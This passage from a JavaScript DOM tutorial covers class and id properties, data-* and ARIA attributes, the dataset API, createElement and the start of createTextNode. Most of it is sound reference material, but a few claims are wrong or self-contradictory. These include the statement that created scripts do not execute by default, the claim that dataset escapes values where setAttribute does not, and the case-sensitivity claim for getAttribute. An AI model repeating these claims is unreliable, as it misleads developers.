const element = document.querySelector('.my-class');
console.log(element.className); // "my-class another-class"
```

**Writing**:

```javascript
element.className = 'new-class'; // Replaces all classes
element.className = ''; // Removes all classes
```

**Behavior characteristics**:

- Returns a **string** containing all classes separated by spaces
- Setting it replaces the entire class list
- Returns empty string `""` if no classes exist
- Whitespace-sensitive: multiple spaces are preserved

```javascript
element.className = 'class1  class2   class3';
console.log(element.className); // "class1  class2   class3" - spaces preserved
```

**Limitations**:

- Manipulating individual classes requires string parsing
- Adding a class without removing others is cumbersome:

```javascript
// Awkward class addition
if (!element.className.includes('new-class')) {
  element.className += ' new-class';
}

// Better approach: use classList
element.classList.add('new-class');
```

### The `classList` Property

The `classList` property provides a `DOMTokenList` interface for class manipulation. It's the modern, preferred way to work with classes.

**Methods**:

- `add(...tokens)` - adds one or more classes
- `remove(...tokens)` - removes one or more classes
- `toggle(token, force?)` - toggles class, optional force parameter
- `contains(token)` - checks if class exists
- `replace(oldToken, newToken)` - replaces one class with another
- `item(index)` - returns class at index
- `entries()`, `forEach()`, `keys()`, `values()` - iteration methods

**Usage examples**:

```javascript
const element = document.querySelector('div');

element.classList.add('active');
element.classList.add('highlight', 'selected'); // Multiple at once

element.classList.remove('active');
element.classList.remove('highlight', 'selected');

element.classList.toggle('hidden'); // Adds if absent, removes if present
element.classList.toggle('visible', true); // Always adds (force=true)
element.classList.toggle('visible', false); // Always removes (force=false)

const hasClass = element.classList.contains('active'); // boolean

element.classList.replace('old-theme', 'new-theme');
```

**Iteration**:

```javascript
element.className = 'class1 class2 class3';

// Array-like access
console.log(element.classList[0]); // "class1"
console.log(element.classList.length); // 3

// forEach
element.classList.forEach(cls => console.log(cls));

// for...of
for (const cls of element.classList) {
  console.log(cls);
}

// Convert to array
const classArray = [...element.classList];
```

**DOMTokenList vs string**:

- `classList` is read-only (can't assign `element.classList = ...`)
- Methods modify the underlying `class` attribute
- Automatically handles whitespace normalization
- Prevents duplicate class names

```javascript
element.classList.add('test');
element.classList.add('test'); // No effect - doesn't duplicate
console.log(element.className); // "test" - appears once
```

### Comparing Properties

|Property|Type|Case|Read/Write|Node Types|Special Behavior|
|---|---|---|---|---|---|
|`id`|String|Case-sensitive|Read/Write|Elements only|Empty string if unset|
|`tagName`|String|Uppercase (HTML)|Read-only|Elements only|N/A|
|`nodeName`|String|Uppercase (HTML)|Read-only|All nodes|Special values for non-elements|
|`localName`|String|Lowercase (HTML)|Read-only|Elements only|Strips namespace prefix|
|`className`|String|Case-sensitive|Read/Write|Elements only|Full class string|
|`classList`|DOMTokenList|Case-sensitive|Read-only object|Elements only|Methods for manipulation|

### Case-Insensitive Comparisons

When comparing tag names, always normalize case:

```javascript
// Unsafe - case-dependent
if (element.tagName === 'div') { /* May fail */ }

// Safe - normalize to uppercase
if (element.tagName === 'DIV') { /* Works in HTML */ }
if (element.tagName.toUpperCase() === 'DIV') { /* Works everywhere */ }

// Safe - use localName (lowercase)
if (element.localName === 'div') { /* Works */ }
```

[Inference] Using `localName` for comparisons may be more intuitive for developers expecting lowercase, though both approaches work reliably when applied consistently.

### Namespace-Related Properties

For elements created with namespace methods, additional properties provide context:

**`namespaceURI`**:

```javascript
const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
console.log(svg.namespaceURI); // "http://www.w3.org/2000/svg"

const div = document.createElement('div');
console.log(div.namespaceURI); // "http://www.w3.org/1999/xhtml"
```

**`prefix`**:

```javascript
const element = document.createElementNS('http://example.com', 'custom:element');
console.log(element.prefix);    // "custom"
console.log(element.localName); // "element"
console.log(element.tagName);   // "custom:element"
```

**`qualifiedName`** (not a property, but returned by some APIs):

- The full name including prefix
- Same as `tagName` for most elements

### Performance Considerations

[Inference] Direct property access (`id`, `tagName`) is generally faster than method calls (`getAttribute()`, `classList` methods) for simple read operations, though modern JavaScript engines optimize both patterns efficiently. The performance difference is typically negligible except in tight loops processing thousands of elements.

**ID lookups**:

```javascript
// Fast - direct property access
const id = element.id;

// Slightly slower - method call with attribute lookup
const id = element.getAttribute('id');
```

**Class manipulation**:

```javascript
// classList methods are optimized internally
element.classList.add('class'); // Preferred

// String manipulation requires parsing
element.className += ' class'; // Less efficient
```

### Global ID Access (Legacy)

Elements with `id` attributes automatically become global properties in older browsers:

```html
<div id="myDiv"></div>

<script>
// Legacy behavior (avoid)
console.log(window.myDiv); // References the div element
console.log(myDiv); // Also works (global scope pollution)

// Modern approach (use this)
const element = document.getElementById('myDiv');
</script>
```

[Inference] This legacy behavior creates potential naming conflicts and is not reliable across all browsers or strict mode. Always use explicit DOM selection methods.

### Dynamic ID and Class Updates

Both `id` and `className`/`classList` changes immediately update the DOM and CSS selector matching:

```javascript
const element = document.querySelector('#oldId');
element.id = 'newId';

// Immediately usable with new ID
document.getElementById('newId'); // Returns the element
document.getElementById('oldId'); // Returns null

// Classes update CSS matching immediately
element.classList.add('highlight');
// CSS rule .highlight {} now applies
```

Browsers re-evaluate CSS selectors and specificity when these properties change, triggering potential reflows and repaints.

---

## Custom Attributes

### Standard vs Custom Attributes

HTML elements support predefined attributes like `id`, `class`, `href`, `src`, and `type` that browsers recognize and process. Custom attributes are non-standard attributes added to elements for application-specific purposes, traditionally written with arbitrary names like `data-user-id` or `role`.

The DOM exposes standard attributes as properties directly on element objects (`element.id`, `element.className`), while custom attributes require explicit methods like `getAttribute()` and `setAttribute()` for access.

### Data Attributes

The HTML5 specification formalized custom attributes through the `data-*` naming convention. Any attribute prefixed with `data-` is valid HTML and intended for storing custom data:

```html
<div data-user-id="12345" 
     data-role="admin" 
     data-last-login="2024-03-15"
     data-preferences='{"theme":"dark","lang":"en"}'>
</div>
```

These attributes:

- Pass HTML validation
- Won't conflict with future HTML specifications
- Are ignored by browsers for styling/behavior (unless targeted via CSS/JS)
- Provide semantic indication of custom data storage

### Dataset API

Elements expose data attributes through the `dataset` property, which returns a `DOMStringMap` object. Attribute names undergo transformation:

- Remove `data-` prefix
- Convert kebab-case to camelCase
- Hyphens followed by lowercase letters become uppercase letters

```javascript
const element = document.querySelector('div');

// Reading
element.dataset.userId; // "12345"
element.dataset.role; // "admin"
element.dataset.lastLogin; // "2024-03-15"
element.dataset.preferences; // '{"theme":"dark","lang":"en"}'

// Writing
element.dataset.userId = "67890";
element.dataset.newAttribute = "value";

// Deleting
delete element.dataset.role;

// Check existence
'userId' in element.dataset; // true
element.dataset.hasOwnProperty('userId'); // true
```

The transformation is bidirectional:

```javascript
element.dataset.userName = "john"; // Creates data-user-name
element.dataset.XMLData = "content"; // Creates data-x-m-l-data
element.dataset['multi-part-name'] = "value"; // Creates data-multi-part-name
```

### getAttribute/setAttribute Methods

For non-data custom attributes or direct attribute manipulation, use these methods:

```javascript
const element = document.querySelector('div');

// Set attributes
element.setAttribute('custom-attr', 'value');
element.setAttribute('aria-label', 'Description');
element.setAttribute('role', 'button');

// Read attributes
element.getAttribute('custom-attr'); // "value"
element.getAttribute('data-user-id'); // "12345"

// Check existence
element.hasAttribute('custom-attr'); // true

// Remove attributes
element.removeAttribute('custom-attr');

// Get all attributes
const attrs = element.attributes; // NamedNodeMap
for (let attr of attrs) {
  console.log(attr.name, attr.value);
}
```

Key differences from dataset:

- Case-sensitive (attribute names are case-insensitive in HTML but case-sensitive when accessed)
- Returns `null` for non-existent attributes (not `undefined`)
- Works with any attribute, not just `data-*`
- Accepts any value type but converts to strings

### Type Handling and Serialization

All attribute values are strings. Type conversion must be handled explicitly:

```javascript
element.dataset.count = 42; // Stored as "42"
typeof element.dataset.count; // "string"

// Manual conversion required
const count = parseInt(element.dataset.count, 10);
const price = parseFloat(element.dataset.price);
const active = element.dataset.active === 'true';

// JSON for complex data
element.dataset.config = JSON.stringify({theme: 'dark', size: 'large'});
const config = JSON.parse(element.dataset.config);
```

Boolean attributes follow HTML conventions where presence indicates `true`:

```javascript
element.setAttribute('disabled', ''); // Disabled
element.setAttribute('disabled', 'disabled'); // Also disabled
element.hasAttribute('disabled'); // true
element.getAttribute('disabled'); // "" or "disabled"

// Standard boolean properties differ
element.disabled = true; // Property
element.getAttribute('disabled'); // "" (attribute)
```

### Performance Considerations

Accessing attributes triggers different code paths than properties:

```javascript
// Property access (fast, direct memory access)
element.id;
element.className;

// Attribute access (slower, string serialization/parsing)
element.getAttribute('id');
element.dataset.userId;
```

[Inference: Modern engines optimize frequent dataset access, but properties remain faster for high-frequency reads]. For intensive operations, cache values:

```javascript
// Suboptimal: reads attribute 1000 times
for (let i = 0; i < 1000; i++) {
  processData(element.dataset.userId);
}

// Optimized: single read
const userId = element.dataset.userId;
for (let i = 0; i < 1000; i++) {
  processData(userId);
}
```

### CSS Attribute Selectors

Custom attributes enable powerful CSS targeting:

```css
/* Select by data attribute presence */
[data-role] { }

/* Select by exact value */
[data-role="admin"] { }

/* Select by value containing word */
[data-permissions~="write"] { }

/* Select by value starting with */
[data-id^="user-"] { }

/* Select by value ending with */
[data-file$=".pdf"] { }

/* Select by value containing substring */
[data-path*="/images/"] { }

/* Case-insensitive matching */
[data-status="active" i] { }
```

Attribute selectors work with any custom attribute, not just `data-*`:

```css
[custom-tooltip] { position: relative; }
[aria-expanded="true"] { }
```

### ARIA Attributes

ARIA (Accessible Rich Internet Applications) attributes are standardized custom attributes for accessibility:

```html
<button aria-label="Close dialog" 
        aria-pressed="false"
        aria-controls="dialog-1">
  ×
</button>

<div role="dialog" 
     aria-labelledby="dialog-title"
     aria-modal="true">
</div>
```

While not `data-*` prefixed, ARIA attributes follow similar patterns:

- Accessed via `getAttribute()`/`setAttribute()`
- No direct property equivalents (except `element.role`)
- String values requiring manual type conversion
- Validated by accessibility tools

```javascript
button.getAttribute('aria-pressed'); // "false" (string)
button.setAttribute('aria-pressed', 'true');
button.setAttribute('aria-label', 'Close dialog');
```

### Microdata Attributes

HTML5 microdata provides another standard for custom attributes:

```html
<div itemscope itemtype="https://schema.org/Person">
  <span itemprop="name">John Doe</span>
  <span itemprop="jobTitle">Software Engineer</span>
  <a itemprop="url" href="https://example.com">Website</a>
</div>
```

These attributes:

- `itemscope`: Defines a new item
- `itemtype`: Specifies item type via URL
- `itemprop`: Names properties within items
- `itemid`: Provides unique identifier
- `itemref`: References elements by ID

Access requires standard attribute methods:

```javascript
element.hasAttribute('itemscope'); // true
element.getAttribute('itemtype'); // "https://schema.org/Person"
```

### Custom Attribute Naming Conventions

Best practices for custom attribute names:

__Use data-_ for application data:_*

```html
<div data-component="modal" data-animation-duration="300"></div>
```

**Use kebab-case for readability:**

```html
<div data-user-preferences="..." data-last-modified-date="..."></div>
```

**Namespace complex applications:**

```html
<div data-app-user-id="123" data-app-session-token="..."></div>
```

**Avoid conflicts with future standards:**

```html
<!-- Risky: may conflict with future HTML -->
<div loading="custom-value"></div>

<!-- Safe: clearly custom -->
<div data-loading-state="custom-value"></div>
```

### Mutation and Reactivity

Attribute changes trigger `MutationObserver` with `attributes: true`:

```javascript
const observer = new MutationObserver(mutations => {
  mutations.forEach(mutation => {
    if (mutation.type === 'attributes') {
      console.log(`${mutation.attributeName} changed`);
      console.log('Old:', mutation.oldValue);
      console.log('New:', mutation.target.getAttribute(mutation.attributeName));
    }
  });
});

observer.observe(element, {
  attributes: true,
  attributeOldValue: true,
  attributeFilter: ['data-status', 'data-count'] // Optional: specific attributes
});

element.dataset.status = 'active'; // Triggers observer
```

CSS attribute selectors automatically respond to changes:

```css
[data-status="loading"] { opacity: 0.5; }
[data-status="complete"] { opacity: 1; }
```

```javascript
element.dataset.status = 'loading'; // Style updates immediately
setTimeout(() => {
  element.dataset.status = 'complete'; // Style updates again
}, 1000);
```

### Security Considerations

Custom attributes are visible in HTML source and developer tools. Never store sensitive data:

```html
<!-- INSECURE -->
<div data-password="secret123" 
     data-api-key="sk_live_abc123"
     data-ssn="123-45-6789"></div>

<!-- SECURE -->
<div data-user-id="12345" 
     data-session-ref="uuid-here"></div>
```

User-supplied data in attributes requires sanitization:

```javascript
// Potential XSS if userName contains quotes
element.setAttribute('data-name', userName);

// Safer: encode or validate
element.setAttribute('data-name', escapeHtml(userName));

// Safest with dataset (handles encoding)
element.dataset.name = userName; // Automatically escaped
```

[Inference: Dataset API provides some protection by handling attribute value encoding, though XSS risks remain if attribute values are later rendered unsafely].

### Cloning and Serialization

Custom attributes are preserved during cloning:

```javascript
const original = document.createElement('div');
original.dataset.userId = '123';
original.setAttribute('custom-attr', 'value');

const clone = original.cloneNode(true);
clone.dataset.userId; // "123"
clone.getAttribute('custom-attr'); // "value"
```

Serialization includes all attributes:

```javascript
element.outerHTML; 
// '<div data-user-id="123" custom-attr="value"></div>'

element.innerHTML = '<span data-role="item">Text</span>';
// Parsed span has data-role attribute
```

### Framework Integration

Many frameworks provide abstractions over custom attributes:

**React** uses `data-*` attributes directly but handles other attributes via props:

```javascript
<div data-user-id={userId} />
// Renders: <div data-user-id="123"></div>
```

**Vue** binds attributes with `v-bind` or `:`:

```javascript
<div :data-user-id="userId"></div>
```

**Svelte** uses standard attribute syntax:

```javascript
<div data-user-id={userId}></div>
```

Frameworks typically convert these to `setAttribute()` calls or direct property assignment based on the attribute name.

### Legacy Patterns

Before `dataset` API, custom attributes used various patterns:

```javascript
// Direct attribute manipulation (pre-HTML5)
element.setAttribute('userid', '123');
element.getAttribute('userid');

// Custom properties on element objects
element.customData = {userId: 123};

// Parallel data structures
const elementData = new WeakMap();
elementData.set(element, {userId: 123});
```

Modern code should prefer `data-*` attributes with `dataset` API for standardization and HTML validity.

---

# Creating and Modifying Elements

## createElement

### Basic Syntax

```javascript
document.createElement(tagName, [options])
```

**Parameters:**

- `tagName` (string): The type of element to create (e.g., "div", "span", "a")
- `options` (object, optional): An options object with an `is` property for custom built-in elements

**Returns:** A new Element node with `nodeType === 1`

### Standard Element Creation

```javascript
const div = document.createElement('div');
console.log(div.nodeType); // 1 (ELEMENT_NODE)
console.log(div.tagName); // "DIV"
console.log(div.nodeName); // "DIV"
console.log(div.parentNode); // null (not yet inserted)
console.log(div.ownerDocument === document); // true
```

**Case Insensitivity in HTML:**

```javascript
// All create the same element in HTML documents
document.createElement('div');
document.createElement('DIV');
document.createElement('DiV');

// All have tagName "DIV"
```

**Case Sensitivity in XML:** In XML documents (including XHTML served with XML MIME type), tag names are case-sensitive:

```javascript
// In XML document
const xmlDoc = document.implementation.createDocument(null, 'root', null);
const lower = xmlDoc.createElement('div'); // Creates <div>
const upper = xmlDoc.createElement('DIV'); // Creates <DIV> (different element)
```

### Element Properties After Creation

**Initial State:**

```javascript
const element = document.createElement('div');

// Node properties
element.nodeType; // 1
element.nodeName; // "DIV"
element.nodeValue; // null
element.textContent; // ""
element.innerHTML; // ""

// Parent/child relationships
element.parentNode; // null
element.parentElement; // null
element.childNodes.length; // 0
element.children.length; // 0

// Attributes
element.attributes.length; // 0
element.id; // ""
element.className; // ""

// State
element.isConnected; // false (not in document)
```

The created element exists in memory but is not part of any document tree until explicitly inserted.

### Setting Attributes and Properties

**Method 1: Direct Property Assignment**

```javascript
const div = document.createElement('div');
div.id = 'myDiv';
div.className = 'container active';
div.textContent = 'Hello World';
div.title = 'Tooltip text';

// Boolean attributes
const input = document.createElement('input');
input.disabled = true;
input.checked = true;
input.required = true;
```

**Method 2: setAttribute()**

```javascript
const div = document.createElement('div');
div.setAttribute('id', 'myDiv');
div.setAttribute('class', 'container');
div.setAttribute('data-value', '123');
div.setAttribute('aria-label', 'Description');

// Custom attributes
div.setAttribute('my-custom-attr', 'value');
```

**Method 3: Object.assign() Pattern**

```javascript
const button = Object.assign(document.createElement('button'), {
  textContent: 'Click Me',
  className: 'btn btn-primary',
  type: 'button',
  onclick: () => console.log('Clicked')
});
```

**Method 4: Chaining Helper**

```javascript
function create(tag, props = {}) {
  const element = document.createElement(tag);
  Object.entries(props).forEach(([key, value]) => {
    if (key === 'textContent' || key === 'innerHTML') {
      element[key] = value;
    } else if (key === 'style' && typeof value === 'object') {
      Object.assign(element.style, value);
    } else if (key.startsWith('on')) {
      element[key] = value;
    } else {
      element.setAttribute(key, value);
    }
  });
  return element;
}

const div = create('div', {
  id: 'container',
  class: 'wrapper',
  textContent: 'Content',
  style: { color: 'red', padding: '10px' },
  onclick: () => console.log('Clicked')
});
```

### Adding Content

**Text Content:**

```javascript
const div = document.createElement('div');

// Method 1: textContent
div.textContent = 'Plain text'; // Escapes HTML

// Method 2: innerHTML
div.innerHTML = '<strong>Bold</strong>'; // Parses HTML

// Method 3: createTextNode + appendChild
const textNode = document.createTextNode('Text content');
div.appendChild(textNode);
```

**Child Elements:**

```javascript
const parent = document.createElement('div');
const child1 = document.createElement('span');
const child2 = document.createElement('span');

child1.textContent = 'First';
child2.textContent = 'Second';

parent.appendChild(child1);
parent.appendChild(child2);

// Result: <div><span>First</span><span>Second</span></div>
```

**Multiple Children Efficiently:**

```javascript
const container = document.createElement('div');
const fragment = document.createDocumentFragment();

for (let i = 0; i < 100; i++) {
  const item = document.createElement('div');
  item.textContent = `Item ${i}`;
  fragment.appendChild(item);
}

container.appendChild(fragment); // Single operation
```

### Inserting Into Document

**appendChild():**

```javascript
const div = document.createElement('div');
div.textContent = 'New content';

document.body.appendChild(div); // Adds to end of body
```

**insertBefore():**

```javascript
const newDiv = document.createElement('div');
const referenceNode = document.querySelector('#reference');

referenceNode.parentNode.insertBefore(newDiv, referenceNode);
// Inserts newDiv before referenceNode
```

**Modern Insertion Methods:**

```javascript
const div = document.createElement('div');
const target = document.querySelector('#target');

// Insert relative to target
target.before(div); // Before target
target.after(div); // After target
target.prepend(div); // First child of target
target.append(div); // Last child of target

// Replace target
target.replaceWith(div);
```

**Multiple Elements:**

```javascript
const container = document.querySelector('#container');

container.append(
  document.createElement('div'),
  document.createElement('span'),
  'Text node', // String automatically becomes text node
  document.createElement('p')
);
```

### HTML Element Types

Different tag names create different HTMLElement subclasses:

```javascript
const div = document.createElement('div');
console.log(div instanceof HTMLDivElement); // true
console.log(div instanceof HTMLElement); // true

const anchor = document.createElement('a');
console.log(anchor instanceof HTMLAnchorElement); // true
anchor.href = 'https://example.com';
anchor.target = '_blank';

const input = document.createElement('input');
console.log(input instanceof HTMLInputElement); // true
input.type = 'text';
input.value = 'default';

const img = document.createElement('img');
console.log(img instanceof HTMLImageElement); // true
img.src = 'image.jpg';
img.alt = 'Description';

const canvas = document.createElement('canvas');
console.log(canvas instanceof HTMLCanvasElement); // true
const ctx = canvas.getContext('2d');
```

### Special Element Types

**Table Elements:**

```javascript
const table = document.createElement('table');
const thead = document.createElement('thead');
const tbody = document.createElement('tbody');
const tr = document.createElement('tr');
const th = document.createElement('th');
const td = document.createElement('td');

// Table-specific methods available
const row = table.insertRow();
const cell = row.insertCell();
```

**Form Elements:**

```javascript
const form = document.createElement('form');
const input = document.createElement('input');
const select = document.createElement('select');
const option = document.createElement('option');
const textarea = document.createElement('textarea');

form.method = 'POST';
form.action = '/submit';

input.type = 'email';
input.name = 'userEmail';
input.required = true;

option.value = 'value1';
option.textContent = 'Option 1';
select.appendChild(option);
```

**Media Elements:**

```javascript
const video = document.createElement('video');
video.src = 'video.mp4';
video.controls = true;
video.autoplay = false;

const audio = document.createElement('audio');
audio.src = 'audio.mp3';
audio.loop = true;

const source = document.createElement('source');
source.src = 'video.webm';
source.type = 'video/webm';
video.appendChild(source);
```

### Self-Closing Elements (Void Elements)

Certain HTML elements cannot have children:

```javascript
const img = document.createElement('img');
const br = document.createElement('br');
const hr = document.createElement('hr');
const input = document.createElement('input');
const meta = document.createElement('meta');
const link = document.createElement('link');

// These cannot have children
img.appendChild(document.createElement('div')); // Works but invalid HTML
// innerHTML for these is always ""
img.innerHTML = '<span>text</span>'; // Ignored
```

**Complete list of void elements:** area, base, br, col, embed, hr, img, input, link, meta, param, source, track, wbr

### Unknown/Custom Elements

Creating elements with unrecognized tag names:

```javascript
const unknown = document.createElement('mycustomtag');
console.log(unknown instanceof HTMLUnknownElement); // true
console.log(unknown.constructor.name); // "HTMLUnknownElement"

// Still works as a generic element
unknown.textContent = 'Content';
document.body.appendChild(unknown);
```

**Custom Elements (Web Components):**

```javascript
// Must contain hyphen in tag name
const custom = document.createElement('my-component');

// Before definition: HTMLElement (in modern browsers)
console.log(custom instanceof HTMLElement); // true

// After definition
class MyComponent extends HTMLElement {
  constructor() {
    super();
    this.attachShadow({ mode: 'open' });
  }
  
  connectedCallback() {
    this.shadowRoot.innerHTML = '<p>Custom content</p>';
  }
}

customElements.define('my-component', MyComponent);

// New instances use custom class
const custom2 = document.createElement('my-component');
console.log(custom2 instanceof MyComponent); // true
```

### Customized Built-in Elements

Extending native elements with custom behavior:

```javascript
class FancyButton extends HTMLButtonElement {
  constructor() {
    super();
    this.addEventListener('click', () => {
      this.style.transform = 'scale(0.95)';
      setTimeout(() => this.style.transform = '', 100);
    });
  }
}

customElements.define('fancy-button', FancyButton, { extends: 'button' });

// Creating customized built-in element
const fancyBtn = document.createElement('button', { is: 'fancy-button' });
console.log(fancyBtn instanceof FancyButton); // true
console.log(fancyBtn instanceof HTMLButtonElement); // true
```

### Namespace and XML Elements

**SVG Elements:**

```javascript
// Wrong - creates HTMLUnknownElement
const wrongSvg = document.createElement('svg');

// Correct - creates SVGSVGElement
const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
console.log(svg instanceof SVGSVGElement); // true

svg.setAttribute('width', '100');
svg.setAttribute('height', '100');

const circle = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
circle.setAttribute('cx', '50');
circle.setAttribute('cy', '50');
circle.setAttribute('r', '40');
circle.setAttribute('fill', 'blue');

svg.appendChild(circle);
document.body.appendChild(svg);
```

**MathML Elements:**

```javascript
const math = document.createElementNS('http://www.w3.org/1998/Math/MathML', 'math');
const mfrac = document.createElementNS('http://www.w3.org/1998/Math/MathML', 'mfrac');
const mn1 = document.createElementNS('http://www.w3.org/1998/Math/MathML', 'mn');
const mn2 = document.createElementNS('http://www.w3.org/1998/Math/MathML', 'mn');

mn1.textContent = '1';
mn2.textContent = '2';

mfrac.appendChild(mn1);
mfrac.appendChild(mn2);
math.appendChild(mfrac);
```

### Performance Considerations

**Document vs Template:**

```javascript
// Inefficient - creates and parses HTML string
function createManyElements1(count) {
  const container = document.createElement('div');
  let html = '';
  for (let i = 0; i < count; i++) {
    html += `<div class="item">${i}</div>`;
  }
  container.innerHTML = html;
  return container;
}

// More efficient - direct createElement
function createManyElements2(count) {
  const container = document.createElement('div');
  const fragment = document.createDocumentFragment();
  
  for (let i = 0; i < count; i++) {
    const div = document.createElement('div');
    div.className = 'item';
    div.textContent = i;
    fragment.appendChild(div);
  }
  
  container.appendChild(fragment);
  return container;
}
```

[Inference: Based on typical browser optimization patterns] Modern browsers optimize `createElement` heavily, but for very large numbers of elements (1000+), `innerHTML` can be faster due to the optimized HTML parser. For moderate numbers with complex structures, `createElement` with DocumentFragment is often more performant.

**Cloning vs Creating:**

```javascript
// Template pattern - create once, clone many
const template = document.createElement('div');
template.className = 'item';
template.innerHTML = '<span class="icon"></span><span class="text"></span>';

function createFromTemplate(text) {
  const clone = template.cloneNode(true);
  clone.querySelector('.text').textContent = text;
  return clone;
}

// Faster than creating from scratch each time for complex structures
for (let i = 0; i < 1000; i++) {
  container.appendChild(createFromTemplate(`Item ${i}`));
}
```

### Memory Management

**Detached Elements:**

```javascript
const div = document.createElement('div');
// Element exists in memory but not in document
// Will be garbage collected when no references remain

let element = document.createElement('div');
document.body.appendChild(element);
element.remove();
element = null; // Allow garbage collection
```

**Event Listener Memory:**

```javascript
function createElementWithListener() {
  const button = document.createElement('button');
  
  // This creates a memory leak if button is removed but reference kept
  button.addEventListener('click', function() {
    console.log('Clicked');
  });
  
  return button;
}

// Better - use weak references or remove listeners
function createElementSafely() {
  const button = document.createElement('button');
  const handler = () => console.log('Clicked');
  
  button.addEventListener('click', handler);
  
  // Store reference to remove later
  button._handler = handler;
  
  return button;
}

// Clean up
const btn = createElementSafely();
btn.removeEventListener('click', btn._handler);
```

### Template Element Special Case

The `<template>` element has special behavior:

```javascript
const template = document.createElement('template');
template.innerHTML = '<div class="item">Content</div>';

console.log(template.content); // DocumentFragment
console.log(template.childNodes.length); // 0 (content is in fragment)
console.log(template.content.childNodes.length); // 1

// Cloning template content
const clone = template.content.cloneNode(true);
document.body.appendChild(clone);
```

### Script Element Execution

Script elements created with `createElement` don't execute by default:

```javascript
const script = document.createElement('script');
script.textContent = 'console.log("This runs")';
document.body.appendChild(script); // ✓ Executes

const script2 = document.createElement('script');
script2.src = 'external.js';
document.head.appendChild(script2); // ✓ Executes

const script3 = document.createElement('script');
script3.innerHTML = 'console.log("test")'; // Using innerHTML
document.body.appendChild(script3); // ✓ Still executes
```

Scripts execute when inserted into the document, but:

```javascript
const div = document.createElement('div');
div.innerHTML = '<script>console.log("This does NOT run")</script>';
document.body.appendChild(div); // Script tag exists but doesn't execute
```

Scripts created through `innerHTML` assignment don't execute for security reasons.

### Style Element

```javascript
const style = document.createElement('style');
style.textContent = `
  .my-class {
    color: red;
    font-size: 16px;
  }
`;

document.head.appendChild(style);
// Styles are now active
```

### Link Element for Stylesheets

```javascript
const link = document.createElement('link');
link.rel = 'stylesheet';
link.href = 'styles.css';
link.type = 'text/css';

// Optional: wait for load
link.onload = () => console.log('Stylesheet loaded');
link.onerror = () => console.error('Failed to load stylesheet');

document.head.appendChild(link);
```

### Meta Elements

```javascript
const viewport = document.createElement('meta');
viewport.name = 'viewport';
viewport.content = 'width=device-width, initial-scale=1.0';
document.head.appendChild(viewport);

const charset = document.createElement('meta');
charset.setAttribute('charset', 'UTF-8');
document.head.appendChild(charset);

const ogTitle = document.createElement('meta');
ogTitle.setAttribute('property', 'og:title');
ogTitle.content = 'Page Title';
document.head.appendChild(ogTitle);
```

### Canvas Context Initialization

```javascript
const canvas = document.createElement('canvas');
canvas.width = 800;
canvas.height = 600;

// Get context before or after appending - both work
const ctx = canvas.getContext('2d');

document.body.appendChild(canvas);

// Now can draw
ctx.fillStyle = 'blue';
ctx.fillRect(0, 0, 100, 100);
```

### IFrame Creation

```javascript
const iframe = document.createElement('iframe');
iframe.src = 'https://example.com';
iframe.width = '600';
iframe.height = '400';
iframe.sandbox = 'allow-scripts allow-same-origin';

iframe.onload = () => {
  // Access iframe document (if same-origin)
  try {
    const iframeDoc = iframe.contentDocument;
    console.log(iframeDoc.title);
  } catch (e) {
    console.log('Cross-origin iframe');
  }
};

document.body.appendChild(iframe);
```

### Common Patterns and Best Practices

**Factory Functions:**

```javascript
function createButton({ text, className, onClick }) {
  const button = document.createElement('button');
  button.textContent = text;
  button.className = className || '';
  if (onClick) button.onclick = onClick;
  return button;
}

const btn = createButton({
  text: 'Submit',
  className: 'btn-primary',
  onClick: () => console.log('Clicked')
});
```

**Builder Pattern:**

```javascript
class ElementBuilder {
  constructor(tagName) {
    this.element = document.createElement(tagName);
  }
  
  attr(name, value) {
    this.element.setAttribute(name, value);
    return this;
  }
  
  text(content) {
    this.element.textContent = content;
    return this;
  }
  
  child(childElement) {
    this.element.appendChild(childElement);
    return this;
  }
  
  on(event, handler) {
    this.element.addEventListener(event, handler);
    return this;
  }
  
  build() {
    return this.element;
  }
}

const div = new ElementBuilder('div')
  .attr('id', 'container')
  .attr('class', 'wrapper')
  .text('Content')
  .on('click', () => console.log('Clicked'))
  .build();
```

**JSX-like Helper:**

```javascript
function h(tag, props = {}, ...children) {
  const element = document.createElement(tag);
  
  Object.entries(props).forEach(([key, value]) => {
    if (key.startsWith('on')) {
      element.addEventListener(key.slice(2).toLowerCase(), value);
    } else if (key === 'className') {
      element.className = value;
    } else if (key === 'style' && typeof value === 'object') {
      Object.assign(element.style, value);
    } else {
      element.setAttribute(key, value);
    }
  });
  
  children.forEach(child => {
    if (typeof child === 'string') {
      element.appendChild(document.createTextNode(child));
    } else if (child instanceof Node) {
      element.appendChild(child);
    }
  });
  
  return element;
}

// Usage
const component = h('div', { className: 'container' },
  h('h1', {}, 'Title'),
  h('p', {}, 'Paragraph text'),
  h('button', { onClick: () => alert('Clicked') }, 'Click me')
);
```

### Sanitization Considerations

When creating elements with user-provided content:

```javascript
// Safe - textContent automatically escapes
function createSafeDiv(userInput) {
  const div = document.createElement('div');
  div.textContent = userInput; // <script> tags become literal text
  return div;
}

// Unsafe - innerHTML can execute scripts
function createUnsafeDiv(userInput) {
  const div = document.createElement('div');
  div.innerHTML = userInput; // Dangerous if userInput contains <script>
  return div;
}

// If innerHTML needed, sanitize first
function createSanitizedDiv(userInput) {
  const div = document.createElement('div');
  // Use DOMPurify or similar library
  div.innerHTML = DOMPurify.sanitize(userInput);
  return div;
}
```

### Cross-Browser Compatibility

`createElement` has excellent cross-browser support going back to IE5. Modern features to watch:

```javascript
// Customized built-in elements - limited support
const fancy = document.createElement('button', { is: 'fancy-button' });
// Not supported in Safari as of 2024

// Modern insertion methods - widely supported now
element.before();
element.after();
element.append();
element.prepend();
element.replaceWith();
// Supported in all modern browsers

// Custom elements - good support
customElements.define('my-element', MyElement);
// Supported in all modern browsers
```

---

## createTextNode

The `document.createTextNode()` method creates a new Text node containing specified string data. Text nodes represent the actual text content within elements and cannot contain HTML markup or child nodes.

### Syntax

```javascript
const textNode = document.createTextNode(data);
```

**Parameters**:

- `data` (string): The text content for the text node

**Returns**: A Text node object

### Basic Usage

```javascript
const textNode = document.createTextNode('Hello, World!');
const paragraph = document.createElement('p');
paragraph.appendChild(textNode);
document.body.appendChild(paragraph);
// Result: <p>Hello, World!</p>
```

### Text Node Characteristics

#### Pure Text Content

Text nodes contain only plain text. HTML markup is treated as literal text, not parsed:

```javascript
const textNode = document.createTextNode('<strong>Bold</strong>');
div.appendChild(textNode);
// Displays: <strong>Bold</strong> (not rendered as bold)
```

#### No Child Nodes

Text nodes are leaf nodes in the DOM tree and cannot have children:

```javascript
